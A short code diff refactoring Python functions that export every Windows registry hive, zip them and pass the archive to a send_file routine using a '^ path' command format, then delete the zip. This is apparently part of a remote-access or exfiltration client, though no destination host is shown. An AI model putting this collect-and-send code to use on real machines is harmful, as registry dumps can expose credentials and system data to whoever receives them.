@@ -22,8 +22,9 @@ def pull_registry():
     regKeys = ['HKEY_CLASSES_ROOT', 'HKEY_CURRENT_USER',
                'HKEY_LOCAL_MACHINE', 'HKEY_USERS', 'HKEY_CURRENT_CONFIG']
 
+    zipfile = 'reg.zip'
     fileNamespathList = []
-    with ZipFile('reg.zip', 'w') as zip:
+    with ZipFile(zipfile, 'w') as zip:
         for key in regKeys:
             fname = f"bkReg_{key}.reg"
             fileNamespathList.append(fname)
@@ -39,10 +40,10 @@ def pull_registry():
         #     os.remove(file)
 
     # path to zip file containing reg keys, start with `^ `
-    exp_cmd = '^ ./reg.zip'
+    exp_cmd = f'^ ./{zipfile}'
     send_file(exp_cmd)
 
-    os.remove('./reg.zip')
+    os.remove(f'./{zipfile}')
 
 
 def send_file(command):
@@ -56,7 +57,7 @@ def send_file(command):
         uses format `^ file_path`
 
     """
-    _, path = command.split()
+    path = command[2:]
     print(f"Pulling file: {path}")
 
     if os.path.exists(path):
